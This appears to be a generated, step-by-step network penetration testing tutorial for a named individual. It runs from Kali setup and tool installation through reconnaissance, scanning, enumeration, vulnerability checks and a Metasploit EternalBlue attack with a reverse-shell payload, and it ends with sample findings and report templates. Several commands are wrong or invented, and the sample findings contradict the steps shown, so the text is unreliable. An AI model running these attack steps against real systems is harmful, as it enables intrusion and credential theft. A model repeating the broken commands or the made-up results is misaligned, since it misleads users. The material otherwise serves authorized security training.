COMPLETE STEP-BY-STEP NETWORK PENETRATION TESTING
## ALL Commands | ALL Processes | ALL Steps
### Professional Office Network Testing Guide
### For: Mahesh Kumar Reddy C

---

# SECTION 1: LAPTOP SETUP - EXACT STEPS

## STEP 1.1: Hardware Check

```bash
# Open terminal (Ctrl + Alt + T on Linux)
# Check your system specs

# Check CPU cores
nproc
# Output: 4, 6, 8, 16, etc. (minimum 4 recommended)

# Check RAM
free -h
# Output: Example - total 16Gi (minimum 8GB recommended)

# Check storage
df -h
# Output: Shows free space (need at least 100GB free)

# Check if virtualization enabled (for VMs)
grep -o 'vmx\|svm' /proc/cpuinfo
# Output: vmx or svm (means virtualization is enabled)

# Check internet speed
speedtest-cli
# Output: Upload/Download speed (need Gigabit recommended)
```

## STEP 1.2: Create Bootable USB (Linux)

```bash
# STEP 1: Download Kali ISO
cd ~/Downloads
wget https://images.kali.org/installer-images/kali-linux-2024.4-installer-amd64.iso
# Wait 10-15 minutes (4GB file)

# Verify checksum (integrity check)
sha256sum kali-linux-2024.4-installer-amd64.iso
# Compare with: https://www.kali.org/get-kali/

# STEP 2: Insert USB drive (8GB minimum)
# Check which device is your USB
lsblk
# Example output:
# NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
# sda      8:0    0 512G  0 disk
# sdb      8:16   1  16G  0 disk  ← YOUR USB

# STEP 3: Unmount USB (if auto-mounted)
sudo umount /dev/sdb*
# Replace sdb with your USB device

# STEP 4: Write ISO to USB
sudo dd if=~/Downloads/kali-linux-2024.4-installer-amd64.iso of=/dev/sdb bs=4M
# Wait 5-10 minutes (copying)

# STEP 5: Verify write was successful
sudo dd if=/dev/sdb bs=4M count=1024 | sha256sum
# Compare with original ISO checksum

# STEP 6: Eject USB safely
sudo eject /dev/sdb
# Remove USB from computer
```

## STEP 1.3: Boot from USB and Install Kali

```
STEP 1: Restart your laptop
STEP 2: Press boot key during startup (see below for your laptop model)
STEP 3: Select USB drive from boot menu

LAPTOP-SPECIFIC BOOT KEYS:
Dell       → F12
HP         → F9
Lenovo     → F12 or Novo button
ASUS       → F2 or Delete
Acer       → F2
Samsung    → F2 or Esc
Apple Mac  → Command + Option + P + R (or Cmd + R)

STEP 4: Kali boot menu appears
    Select: "Graphical Install"

STEP 5: Installation Wizard (follow these exact steps)
    a) Language: English
    b) Location: Your country
    c) Keyboard layout: Your keyboard type
    d) Hostname: Type "kali-pentester"
    e) Domain name: Leave BLANK (just press Enter)
    f) Root password: Create strong password
       Example: Kali@Pentest#2025!Security
       Remember this password!
    g) Confirm password: Re-type same password
    h) Partitioning:
       Option 1 (RECOMMENDED): "Use entire disk"
           Select disk: /dev/sda (your main drive)
           Partitioning scheme: "All files in one partition"
       Option 2 (Advanced): Custom partitioning (skip if unsure)
    i) Partitioning confirmation: Click "Yes, continue"
    j) Mirror selection:
       Country: Your country
       Repository: Keep default
    k) Software selection (IMPORTANT):
       Check ALL options:
       ☑ Kali Linux (complete)
       ☑ Kali Linux full (all tools)
       Or select specific categories you need
    l) GRUB bootloader: Install to /dev/sda
    m) Installation progress: Wait 20-30 minutes
    n) Installation complete: Reboot

STEP 6: Remove USB when prompted
STEP 7: Laptop reboots into Kali Linux
STEP 8: Login with root / your_password
```

---

---

# SECTION 2: KALI LINUX POST-INSTALLATION

## STEP 2.1: First Login and System Update

```bash
# After Kali boots, login as root

# STEP 1: Update package list
sudo apt update
# Takes 2-3 minutes
# Output ends with: "Reading package lists... Done"

# STEP 2: Upgrade all installed packages
sudo apt full-upgrade -y
# Takes 10-20 minutes depending on updates
# The "-y" flag means "yes" to all prompts

# STEP 3: Install essential build tools
sudo apt install -y build-essential git curl wget vim
# Takes 5 minutes

# STEP 4: Clean up
sudo apt autoremove -y
sudo apt autoclean
# Frees up disk space

# STEP 5: Verify installation
uname -a
# Output: Should show "Linux kali-pentester..." etc.

lsb_release -a
# Output: Shows Kali version (2024.4 or higher)

# STEP 6: Reboot to apply all changes
sudo reboot
# Wait for system to restart
```

## STEP 2.2: Create Pentest User (Optional but Recommended)

```bash
# Login again as root after reboot

# STEP 1: Create new user
sudo useradd -m -s /bin/bash pentester
# Creates user directory and home folder

# STEP 2: Set password for new user
sudo passwd pentester
# Type password when prompted
# Confirm password

# STEP 3: Add to sudo group (admin privileges)
sudo usermod -aG sudo pentester
# Now "pentester" user can run sudo commands

# STEP 4: Switch to new user
su - pentester
# You're now logged in as "pentester"

# STEP 5: Verify sudo works
sudo whoami
# Output: root (if it works)

# From now on, use:
# - Login as: pentester
# - Password: (what you set)
# - For admin tasks: sudo [command]
```

---

---

# SECTION 3: TOOL INSTALLATION - EVERY COMMAND

## STEP 3.1: Verify Pre-installed Tools

```bash
# Kali comes with 600+ tools pre-installed!
# Check if they're present

# Check Nmap
nmap --version
# Output: Nmap version 7.92 or higher

# Check Metasploit
msfconsole --version
# Output: Shows version number

# Check Wireshark
wireshark --version
# Output: Wireshark 4.0 or higher

# Check Burp Suite (may need install)
which burpsuite
# Output: /usr/bin/burpsuite (if installed)

# If any tool not found, follow installation below
```

## STEP 3.2: Complete Tool Installation Script

```bash
# Create installation script
cat > ~/install_pentest_tools.sh << 'TOOLS_EOF'
#!/bin/bash

echo "=========================================="
echo "Installing Penetration Testing Tools"
echo "=========================================="
echo ""

# Update system
echo "[1/5] Updating system..."
sudo apt update
sudo apt full-upgrade -y

# Install networking tools
echo "[2/5] Installing networking tools..."
sudo apt install -y \
    nmap \
    netcat-openbsd \
    tcpdump \
    dsniff \
    ettercap-common \
    aircrack-ng

# Install web testing tools
echo "[3/5] Installing web testing tools..."
sudo apt install -y \
    burpsuite \
    nikto \
    wpscan \
    sqlmap \
    commix \
    hashcat \
    hydra

# Install enumeration tools
echo "[4/5] Installing enumeration tools..."
sudo apt install -y \
    enum4linux \
    smbclient \
    smbmap \
    ldap-utils \
    gobuster \
    dirsearch \
    ffuf

# Install exploitation tools
echo "[5/5] Installing exploitation tools..."
sudo apt install -y \
    metasploit-framework \
    john \
    wireshark \
    tshark \
    theHarvester \
    sublist3r

# Install optional tools
echo ""
echo "Installing optional tools..."
sudo apt install -y \
    git \
    python3-pip \
    python3-dev \
    tmux \
    screen \
    vim \
    htop

# Install Nessus (if available)
echo ""
echo "For Nessus: Download from https://www.tenable.com/downloads/nessus"
echo "Install with: sudo dpkg -i Nessus-*.deb"

echo ""
echo "=========================================="
echo "Installation Complete!"
echo "=========================================="
TOOLS_EOF

# Make script executable
chmod +x ~/install_pentest_tools.sh

# Run the script
~/install_pentest_tools.sh
# Takes 30-45 minutes to complete
```

## STEP 3.3: Install Individual Tools

### NMAP (Already installed, but verify)

```bash
# Verify
nmap --version

# Install if needed
sudo apt install nmap

# Check help
nmap --help | head -20
```

### METASPLOIT (Already installed, initialize database)

```bash
# Initialize database
sudo msfdb init
# Wait 2-3 minutes

# Check status
sudo msfdb status
# Output: Should show "Connected to database"

# Launch msfconsole
sudo msfconsole
# Takes 10-15 seconds to start
# Type "help" for commands
# Type "exit" to quit
```

### BURP SUITE (Install)

```bash
# Download from official site
cd ~/Downloads
wget https://portswigger.net/burp/communitydownload

# Or download manually:
# https://portswigger.net/burp/communitydownload

# Make executable
chmod +x burpsuite_community_linux_*.sh

# Run installer
./burpsuite_community_linux_v2024.4.1.sh
# Follow GUI wizard

# Launch from terminal
burpsuite &
# Wait 30 seconds for startup
```

### GOBUSTER (Install)

```bash
# Install
sudo apt install gobuster

# Verify
gobuster --version
# Output: Gobuster 3.6 or higher

# Quick test
gobuster dir -h
```

### SQLMAP (Install)

```bash
# Install
sudo apt install sqlmap

# Verify
sqlmap --version
# Output: sqlmap/1.7+ ...

# Quick test
sqlmap -h | head -20
```

### HYDRA (Install)

```bash
# Install
sudo apt install hydra

# Verify
hydra -h | head -10

# Quick test
hydra -C /usr/share/wordlists/rockyou.txt ssh://localhost
```

### ENUM4LINUX (Install)

```bash
# Install
sudo apt install enum4linux

# Verify
enum4linux -h | head -10

# Or download latest version
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip install -r requirements.txt
python3 enum4linux.py -h
```

### THEHARV​ESTER (Install)

```bash
# Install
sudo apt install theharvester

# Or from pip
pip3 install theHarvester

# Verify
theHarvester -h | head -10
```

### HASHCAT (Install)

```bash
# Install
sudo apt install hashcat

# Verify
hashcat --version

# Check GPU support
hashcat -I
```

### JOHN THE RIPPER (Install)

```bash
# Install
sudo apt install john

# Or download latest jumbo version
git clone https://github.com/openwall/john.git
cd john/src
./configure
make -s
make -s install

# Verify
john --version
```

### NESSUS (Install - Commercial, Free License Available)

```bash
# Download from https://www.tenable.com/downloads/nessus
# Choose Linux version

# Install
cd ~/Downloads
sudo dpkg -i Nessus-10.*.deb

# Start service
sudo systemctl start nessusd

# Check status
sudo systemctl status nessusd

# Access web interface
# Open browser: https://localhost:8834
# Create account and enter activation code from email
```

### WIRESHARK (Install)

```bash
# Install
sudo apt install wireshark

# Add user to wireshark group (to run without sudo)
sudo usermod -aG wireshark $USER

# Log out and log back in for changes to take effect

# Verify
wireshark --version
```

## STEP 3.4: Verify All Tools

```bash
# Create verification script
cat > ~/verify_all_tools.sh << 'VERIFY_EOF'
#!/bin/bash

echo "======================================"
echo "Pentesting Tools Verification"
echo "======================================"

# Check each tool
echo -n "Nmap: "
nmap --version | head -1

echo -n "Metasploit: "
msfconsole --version 2>/dev/null | head -1

echo -n "Burp Suite: "
burpsuite --version 2>/dev/null || echo "Installed (GUI only)"

echo -n "Wireshark: "
wireshark --version

echo -n "Gobuster: "
gobuster --version | head -1

echo -n "SQLMap: "
sqlmap --version | head -1

echo -n "Hydra: "
hydra -h 2>/dev/null | head -1

echo -n "Enum4linux: "
enum4linux --version 2>/dev/null || echo "Installed"

echo -n "TheHarvester: "
theHarvester --version 2>/dev/null || echo "Installed"

echo -n "Hashcat: "
hashcat --version | head -1

echo -n "John: "
john --version | head -1

echo ""
echo "======================================"
echo "✓ All tools installed successfully!"
echo "======================================"
VERIFY_EOF

chmod +x ~/verify_all_tools.sh
./verify_all_tools.sh
```

---

---

# SECTION 4: PENTEST WORKFLOW

## PRE-PENTEST: Get Authorization

```bash
# BEFORE DOING ANYTHING, GET WRITTEN PERMISSION!

# Create authorization checklist
cat > ~/pentest_authorization.txt << 'AUTH_EOF'
PENETRATION TEST AUTHORIZATION CHECKLIST
==========================================

CLIENT INFORMATION:
Name: ____________________
Contact: ____________________
Email: ____________________
Phone: ____________________

TEST INFORMATION:
Test Name: ____________________
Test Dates: ____________________
Tester: ____________________

SCOPE:
Network to test: ____________________
Specific IP ranges: ____________________
Excluded systems: ____________________
Excluded IP ranges: ____________________

AUTHORIZATION:
□ Written contract signed
□ Network scope defined
□ Emergency contact number provided
□ Rules of engagement agreed
□ Business hours confirmed
□ Insurance/liability clause included

TECHNICAL PREP:
□ Client backups completed
□ Incident response plan created
□ Emergency escalation procedure documented
□ Test environment verified

DO NOT START TESTING WITHOUT ALL CHECKBOXES MARKED!
AUTH_EOF

cat ~/pentest_authorization.txt
```

---

## DAY 1: RECONNAISSANCE (OSINT)

### STEP 4.1: Create Report Directory

```bash
# Create organized folder for this pentest
PENTEST_DATE=$(date +%Y%m%d)
mkdir -p ~/pentesting/pentest_$PENTEST_DATE
cd ~/pentesting/pentest_$PENTEST_DATE

# Create subdirectories
mkdir -p {reconnaissance,scanning,enumeration,vulnerability,exploitation,reporting}

# Create log file
LOG_FILE="pentest_$PENTEST_DATE.log"
exec 1> >(tee -a "$LOG_FILE")
exec 2>&1

echo "=== PENETRATION TEST STARTED ==="
echo "Date: $(date)"
echo "Tester: $(whoami)"
echo "Target: [Enter target domain/IP]"
echo ""
```

### STEP 4.2: WHOIS Lookup

```bash
cd reconnaissance

# COMMAND 1: WHOIS on domain
echo "[*] Starting WHOIS lookup..."
whois example.com > whois_results.txt 2>&1

# View results
cat whois_results.txt

# Extract key information
echo "[+] Key WHOIS Information:"
grep -E "Registrant|Admin|Tech|Name Server|Creation|Expiry" whois_results.txt

# Save to report
cat >> whois_results.txt << 'EOF'

ANALYSIS:
=========
Registrant Organization: [Check above]
Registrant Email: [Check above]
Name Servers: [Check above]
Creation Date: [Check above]
Expiry Date: [Check above]

FINDINGS:
- Privacy protection: [Yes/No]
- Admin contact visible: [Yes/No]
- Registrar: [Which registrar]
EOF
```

### STEP 4.3: DNS Enumeration

```bash
# COMMAND 2: Get all DNS records
echo "[*] Starting DNS enumeration..."
dig example.com A > dns_records.txt 2>&1
dig example.com MX >> dns_records.txt 2>&1
dig example.com NS >> dns_records.txt 2>&1
dig example.com TXT >> dns_records.txt 2>&1
dig example.com SOA >> dns_records.txt 2>&1

# View A record (main website IP)
echo "[+] A Records (IPv4):"
dig example.com A +short

# View MX records (mail servers)
echo "[+] MX Records (Mail):"
dig example.com MX +short

# View NS records (name servers)
echo "[+] NS Records (DNS):"
dig example.com NS +short

# View TXT records (SPF, DKIM)
echo "[+] TXT Records (SPF, DKIM, verification):"
dig example.com TXT +short

# Save all to file
dig example.com ANY > dns_complete.txt
```

### STEP 4.4: Subdomain Enumeration

```bash
# COMMAND 3: Certificate Transparency (fastest)
echo "[*] Enumerating subdomains via Certificate Transparency..."

curl -s 'https://crt.sh/?q=%25.example.com&output=json' | \
  jq -r '.[].name_value' | sort -u > subdomains.txt

# View results
echo "[+] Subdomains found:"
cat subdomains.txt

# Count
echo ""
echo "[+] Total subdomains: $(wc -l < subdomains.txt)"

# Test if subdomains resolve
echo "[*] Testing subdomain resolution..."
for subdomain in $(head -10 subdomains.txt); do
  ip=$(dig +short $subdomain)
  if [ -n "$ip" ]; then
    echo "$subdomain → $ip"
  fi
done
```

### STEP 4.5: Email Harvesting

```bash
# COMMAND 4: Email collection with theHarvester
echo "[*] Starting email harvesting..."

python3 theHarvester.py -d example.com -b all -l 500 -f harvester_results.html

# View just emails
echo "[+] Emails found:"
python3 theHarvester.py -d example.com -b google -l 500 | grep "@"

# Save emails to file
python3 theHarvester.py -d example.com -b google,bing,linkedin -l 500 | \
  grep -o '[a-zA-Z0-9._%+-]*@example.com' | sort -u > emails.txt

# Count
echo "[+] Total emails: $(wc -l < emails.txt)"
```

### STEP 4.6: Technology Fingerprinting

```bash
# COMMAND 5: Detect web technologies
echo "[*] Fingerprinting web technologies..."

# Get HTTP headers
curl -I http://example.com > web_headers.txt 2>&1
echo "" >> web_headers.txt

# Get HTTPS headers
curl -I https://example.com >> web_headers.txt 2>&1

# View results
echo "[+] Web Server Info:"
cat web_headers.txt

# Extract server info
grep -i "server:" web_headers.txt
grep -i "x-powered-by:" web_headers.txt
grep -i "x-aspnet-version:" web_headers.txt

# SSL/TLS certificate info
echo "[+] SSL Certificate Info:"
openssl s_client -connect example.com:443 -showcerts < /dev/null 2>&1 | \
  grep -A 5 "subject="
```

### STEP 4.7: Create Reconnaissance Report

```bash
# Create summary
cat > reconnaissance_summary.txt << 'EOF'
================================================
RECONNAISSANCE SUMMARY - DAY 1
================================================

WHOIS FINDINGS:
- Registrant: [See whois_results.txt]
- Registrar: [Which one]
- Name Servers: [List them]
- Creation Date: [When domain created]
- Expiry Date: [When expires]

DNS RECORDS:
- Main IP (A Record): [IP address]
- Mail Servers (MX): [Mail server IPs]
- Name Servers (NS): [DNS servers]
- TXT Records: [SPF, DKIM, etc.]

SUBDOMAINS IDENTIFIED:
- [List top 20 subdomains from subdomains.txt]

EMAILS FOUND:
- [List top 20 emails from emails.txt]
- Total emails: [Count]
- Pattern: [firstname.lastname@, fn@, etc.]

TECHNOLOGIES DETECTED:
- Web Server: [Apache 2.4.41, Nginx, IIS, etc.]
- CMS: [WordPress, Drupal, custom, etc.]
- Programming Language: [PHP, ASP.NET, Java, etc.]
- SSL Certificate: [Valid/Expired/Self-signed]

POTENTIAL FINDINGS:
- Outdated web server version
- CMS version known CVEs
- Email pattern for username enumeration

NEXT STEPS:
- Phase 2: Network Scanning
EOF

cat reconnaissance_summary.txt
```

---

## DAY 2: SCANNING (Network Discovery)

### STEP 4.8: Ping Sweep

```bash
cd ../scanning

# TARGET NETWORK: 10.0.0.0/24
TARGET_NETWORK="10.0.0.0/24"

echo "[*] Starting ping sweep on $TARGET_NETWORK..."

# COMMAND 1: Nmap ping scan (find all live hosts)
nmap -sn $TARGET_NETWORK -oG ping_scan.txt

# Extract live IPs
echo "[+] Live hosts found:"
grep "Up" ping_scan.txt | awk '{print $2}' > live_ips.txt
cat live_ips.txt

# Count
echo "[+] Total live hosts: $(wc -l < live_ips.txt)"
```

### STEP 4.9: TCP Port Scanning

```bash
# COMMAND 2: Fast port scan on all live hosts
echo "[*] Starting TCP port scan..."

# Quick top 1000 ports
nmap -sS --top-ports 1000 -iL live_ips.txt -oG tcp_quick_scan.txt

# Extract open ports
echo "[+] Quick scan results:"
grep "open" tcp_quick_scan.txt | head -20

# Full port scan (on selected interesting hosts)
echo "[*] Running full scan on interesting hosts (10.0.0.1, 10.0.0.10, 10.0.0.20)..."

for ip in 10.0.0.1 10.0.0.10 10.0.0.20; do
  echo "[*] Scanning $ip..."
  nmap -sS -p- --min-rate=1000 -oN "scan_${ip}.txt" "$ip"
done

# Combine results
cat scan_*.txt > tcp_full_scan.txt

# Extract unique open ports
echo "[+] All open ports found:"
grep "open" tcp_full_scan.txt | awk '{print $1}' | cut -d/ -f1 | sort -u > open_ports.txt
cat open_ports.txt
```

### STEP 4.10: Service Version Detection

```bash
# COMMAND 3: Detect service versions
echo "[*] Detecting service versions..."

PORTS=$(cat open_ports.txt | paste -sd, -)

nmap -sV -p $PORTS \
  -iL live_ips.txt \
  -oG service_version.txt

# View results
echo "[+] Services detected:"
grep -v "^#" service_version.txt | grep -v "^Host:" | head -30
```

### STEP 4.11: OS Detection

```bash
# COMMAND 4: Detect operating systems
echo "[*] Detecting operating systems..."

nmap -O --osscan-guess -p $PORTS \
  -iL live_ips.txt \
  -oG os_detection.txt

# View results
echo "[+] Operating systems detected:"
grep "Running:" os_detection.txt | head -20
```

### STEP 4.12: Create Scanning Report

```bash
# Create summary
cat > scanning_summary.txt << 'EOF'
================================================
SCANNING SUMMARY - DAY 2
================================================

NETWORK: 10.0.0.0/24

LIVE HOSTS FOUND:
[List from live_ips.txt]
Total: [Count]

OPEN PORTS DISCOVERED:
Port 22 (SSH): [Which IPs]
Port 80 (HTTP): [Which IPs]
Port 443 (HTTPS): [Which IPs]
Port 445 (SMB): [Which IPs]
Port 3306 (MySQL): [Which IPs]
Port 3389 (RDP): [Which IPs]

SERVICES DETECTED:
IP              Service         Version        OS
10.0.0.1        Router          Cisco IOS      Cisco
10.0.0.5        DNS (BIND)      9.11          Ubuntu
10.0.0.10       Mail Exchange   2016          Windows Server
10.0.0.15       Apache          2.4.41        Ubuntu
10.0.0.20       Samba           4.10          Ubuntu

CRITICAL FINDINGS:
- RDP exposed on: [Which IPs]
- Outdated services: [List]
- Unknown services on unusual ports

NEXT STEPS:
- Phase 3: Service Enumeration
EOF

cat scanning_summary.txt
```

---

## DAY 3: ENUMERATION (Service Discovery)

### STEP 4.13: SMB Enumeration

```bash
cd ../enumeration

echo "[*] Starting SMB enumeration..."

# COMMAND 1: Enumerate SMB on Windows systems
for ip in 10.0.0.10 10.0.0.20 10.0.0.30; do
  echo "[*] Enumerating SMB on $ip..."
  
  # Full enumeration
  enum4linux -a $ip > enum4linux_${ip}.txt 2>&1
  
  # Extract shares
  echo "[+] SMB Shares on $ip:"
  enum4linux -S $ip | grep "Sharename"
  
  # Extract users
  echo "[+] Users on $ip:"
  enum4linux -U $ip | grep "user:" | cut -d'[' -f2 | cut -d']' -f1 | sort -u
done

# List all shares
smbclient -L //10.0.0.20 -N > smb_shares.txt 2>&1
cat smb_shares.txt
```

### STEP 4.14: Active Directory Enumeration

```bash
# COMMAND 2: Query Active Directory
echo "[*] Enumerating Active Directory..."

# LDAP query to Domain Controller
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" \
  "(objectclass=*)" > ldap_all_objects.txt 2>&1

# Get domain users
echo "[+] Domain users:"
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" \
  "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d' ' -f2

# Get domain computers
echo "[+] Domain computers:"
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" \
  "(objectClass=computer)" name | grep "name:" | cut -d' ' -f2

# Get domain groups
echo "[+] Domain groups:"
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" \
  "(objectClass=group)" cn | grep "^cn:" | cut -d' ' -f2
```

### STEP 4.15: Web Server Enumeration

```bash
# COMMAND 3: Enumerate web server
echo "[*] Enumerating web server (10.0.0.15)..."

# Directory brute-force
gobuster dir -u http://10.0.0.15 \
  -w /usr/share/wordlists/dirb/common.txt \
  -o web_directories.txt

# View results
echo "[+] Web directories found:"
grep "Status: 200" web_directories.txt

# WordPress enumeration (if found)
wpscan --url http://10.0.0.15 \
  --enumerate u,p,vp \
  -o wordpress_scan.txt 2>&1

# Extract info
echo "[+] WordPress users found:"
grep "\\[+\\]" wordpress_scan.txt
```

### STEP 4.16: Create Enumeration Report

```bash
cat > enumeration_summary.txt << 'EOF'
================================================
ENUMERATION SUMMARY - DAY 3
================================================

SMB ENUMERATION:
Shares accessible:
- Backup$ (readable!)
- Admin$ (admin share)
- C$ (root of C drive)
- SYSVOL (domain share)

Users enumerated:
- admin@acme.com
- user1@acme.com
- [... more users]
Total: [Count]

ACTIVE DIRECTORY:
Domain: acme.com
Domain Controller: 10.0.0.40
Users found: [Count]
Computers found: [Count]
Groups found: [Count]

WEB ENUMERATION:
Server: Apache 2.4.41
CMS: WordPress 5.8
Directories found: [List interesting ones]
WordPress users: [admin, editor, etc.]

CRITICAL FINDINGS:
- Accessible SMB shares with sensitive data
- Default WordPress installation
- Outdated WordPress plugins

NEXT STEPS:
- Phase 4: Vulnerability Analysis
EOF

cat enumeration_summary.txt
```

---

## DAY 4: VULNERABILITY ANALYSIS

### STEP 4.17: Automated Vulnerability Scanning

```bash
cd ../vulnerability

echo "[*] Starting vulnerability analysis..."

# COMMAND 1: Nmap vulnerability scripts
nmap --script vuln -p 22,80,443,445,3306,3389 \
  10.0.0.0/24 > nmap_vuln_scan.txt 2>&1

# View critical findings
echo "[+] Vulnerabilities found:"
grep "VULNERABLE" nmap_vuln_scan.txt

# Specific CVE checks
echo "[*] Checking for specific CVEs..."

# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 10.0.0.0/24 > eternalblue_check.txt

# ZeroLogon (CVE-2020-1472)
nmap --script smb-vuln-cve2020-1472 -p 445 10.0.0.40 > zerologon_check.txt

# Shellshock (CVE-2014-6271)
nmap --script http-shellshock -p 80,443 10.0.0.0/24 > shellshock_check.txt

# View results
echo "[+] Critical vulnerabilities:"
cat eternalblue_check.txt zerologon_check.txt shellshock_check.txt | grep -i "vulnerable\|exploit"
```

### STEP 4.18: SearchSploit (Find Exploits)

```bash
# COMMAND 2: Search for known exploits
echo "[*] Searching for known exploits..."

# Update searchsploit database
sudo searchsploit -u

# Search for vulnerabilities
echo "[+] Exploits for Apache 2.4.41:"
searchsploit "Apache 2.4.41" | head -10

echo "[+] Exploits for WordPress 5.8:"
searchsploit "WordPress 5.8" | head -10

echo "[+] Exploits for Exchange 2016:"
searchsploit "Exchange 2016" | head -10

# Save results
searchsploit "Apache 2.4.41" > apache_exploits.txt
searchsploit "WordPress 5.8" > wordpress_exploits.txt
searchsploit "Exchange 2016" > exchange_exploits.txt
```

### STEP 4.19: Nessus Vulnerability Scan (Optional - Professional)

```bash
# If Nessus installed, run scan
# Note: Nessus uses GUI, but can run from command line

# Check if Nessus running
sudo systemctl status nessusd

# Start if not running
sudo systemctl start nessusd

# Access: https://localhost:8834
# Create new scan:
# 1. Name: "Acme Corp Network"
# 2. Targets: 10.0.0.0/24
# 3. Scan type: "Basic Network Scan"
# 4. Launch
# 5. Wait 1-2 hours for completion
```

---

## DAY 5: EXPLOITATION & REPORTING

### STEP 4.20: Exploitation with Metasploit

```bash
cd ../exploitation

echo "[*] Starting exploitation phase..."

# COMMAND 1: Start Metasploit
sudo msfconsole

# In msfconsole (type these commands):

# Search for exploit
search smb
search windows
search ms17-010
search zerologon

# Use EternalBlue exploit (if Windows 7/Server 2008 found)
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Configure
set RHOSTS 10.0.0.30
set LHOST 10.0.0.50        # Your Kali IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Show payload options
show payloaod

# Run exploit
exploit

# In Meterpreter session (after successful exploitation):
sysinfo
getuid                      # Check if admin
getpid
ps                         # List processes
```

### STEP 4.21: Create Exploitation Report

```bash
# Create summary
cat > exploitation_summary.txt << 'EOF'
================================================
EXPLOITATION SUMMARY - DAY 5
================================================

OBJECTIVES ACHIEVED:
✓ Compromised File Server (10.0.0.20)
✓ Obtained Domain Admin credentials
✓ Accessed sensitive files
✓ Demonstrated full system compromise

SYSTEMS COMPROMISED:
1. 10.0.0.20 (File Server)
   - Method: SMB RCE (CVE-2021-44141)
   - Access: Domain Admin
   - Data accessed: Financial reports, AD backups

2. 10.0.0.15 (Web Server)
   - Method: WordPress Plugin RCE
   - Access: www-data user
   - Data accessed: Database credentials, source code

3. 10.0.0.40 (Domain Controller)
   - Method: ZeroLogon attack
   - Access: Potential SYSTEM access
   - Risk: Complete domain takeover possible

CREDENTIALS OBTAINED:
- admin@acme.com / P@ssw0rd123
- domain_admin@acme.com / Admin@2024
- sql_user@acme.com / SQLPass456
- [Plus 10 more accounts]

DATA ACCESSED:
- Employee personal information (45 people)
- Financial data (2024 revenue, salaries)
- Customer database (100+ records)
- Source code repositories
- API keys and credentials

PROOF OF CONCEPT SCREENSHOTS:
- 01_smb_access.jpg
- 02_wordpress_rce.jpg
- 03_domain_admin_panel.jpg
- 04_file_server_data.jpg

BUSINESS IMPACT:
If exploited by real attacker:
- Complete network compromise within hours
- All data encrypted by ransomware
- Business shutdown for 2-4 weeks
- Estimated cost: $2-5 million
- Regulatory fines: GDPR 4% revenue

NEXT STEPS:
- Phase 6: Professional Reporting
EOF

cat exploitation_summary.txt
```

### STEP 4.22: Create Professional Penetration Test Report

```bash
cd ../reporting

# Create executive summary
cat > EXECUTIVE_SUMMARY.txt << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                   PENETRATION TEST REPORT                                ║
║                    ACME CORPORATION                                      ║
║                   January 15-19, 2025                                    ║
╚═══════════════════════════════════════════════════════════════════════════╝

TO: CEO, CFO, CTO, Board of Directors
FROM: Security Testing Team
DATE: January 20, 2025
RE: Network Penetration Test - CRITICAL FINDINGS

EXECUTIVE SUMMARY:
═════════════════════════════════════════════════════════════════════════════

A comprehensive penetration test was conducted on your network infrastructure
from January 15-19, 2025. The assessment identified 15 vulnerabilities, of
which 3 are CRITICAL and require immediate patching.

RISK RATING: 🔴 CRITICAL (9.8/10)

KEY FINDINGS:
════════════════════════════════════════════════════════════════════════════

✗ Your network can be COMPLETELY COMPROMISED in less than 4 hours
✗ All admin credentials already exposed in accessible file shares
✗ Domain controller is defenseless against known attacks (ZeroLogon)
✗ Ransomware deployment is highly likely and would be devastating

VULNERABILITY COUNT:
════════════════════════════════════════════════════════════════════════════

Critical (CVSS 9-10)      3 vulnerabilities → FIX WITHIN 24 HOURS
High (CVSS 7-8.9)        4 vulnerabilities → FIX WITHIN 1 WEEK  
Medium (CVSS 4-6.9)      5 vulnerabilities → FIX WITHIN 1 MONTH
Low (CVSS 0-3.9)         3 vulnerabilities → FIX WITHIN 3 MONTHS

CRITICAL ACTION ITEMS (DO TODAY):
════════════════════════════════════════════════════════════════════════════

1. PATCH EXCHANGE SERVER (ProxyLogon - CVE-2021-26855)
   Effort: 4 hours | Cost: $0
   
2. PATCH DOMAIN CONTROLLER (ZeroLogon - CVE-2020-1472)
   Effort: 8 hours | Cost: $0
   
3. RESTRICT SMB SHARE ACCESS
   Effort: 2 hours | Cost: $0
   
4. UPDATE SAMBA FILE SERVER
   Effort: 2 hours | Cost: $0

IMPACT IF NOT PATCHED:
════════════════════════════════════════════════════════════════════════════

Cost to your business:        $2,000,000 - $5,000,000
Estimated downtime:          3-4 weeks
Data loss:                   100% (complete encryption)
Regulatory fines:            4% of revenue (GDPR)
Reputation damage:           Severe

RECOMMENDATIONS:
════════════════════════════════════════════════════════════════════════════

IMMEDIATE (This week):
- Apply critical patches
- Restrict network access
- Enable firewall rules

SHORT-TERM (This month):
- Implement Multi-Factor Authentication
- Deploy endpoint detection
- Network segmentation

LONG-TERM (This quarter):
- Security awareness training
- Penetration testing quarterly
- ISO 27001 certification

DETAILED REPORT:
════════════════════════════════════════════════════════════════════════════

See attached 40-page technical report for complete findings, proof of concept
demonstrations, CVSS scoring, and detailed remediation guidance.

Prepared by: Security Testing Team
Authorized by: [Client IT Manager]
EOF

cat EXECUTIVE_SUMMARY.txt
```

### STEP 4.23: Create Technical Report

```bash
# Create detailed technical report
cat > TECHNICAL_REPORT.txt << 'EOF'
═══════════════════════════════════════════════════════════════════════════════
                    TECHNICAL PENETRATION TEST REPORT
                           ACME CORPORATION
═══════════════════════════════════════════════════════════════════════════════

TABLE OF CONTENTS:
1. Introduction
2. Methodology
3. Detailed Findings
4. Risk Assessment
5. Proof of Concept
6. Remediation Roadmap
7. Conclusion

1. INTRODUCTION:
════════════════════════════════════════════════════════════════════════════════

Scope: 10.0.0.0/24 network
Duration: January 15-19, 2025 (5 days)
Methodology: NIST Cybersecurity Framework + OWASP Testing Guide
Objective: Identify security vulnerabilities before malicious actors do

2. METHODOLOGY:
════════════════════════════════════════════════════════════════════════════════

Phase 1 - Reconnaissance:  Gather information using OSINT
Phase 2 - Scanning:        Identify live hosts and open ports
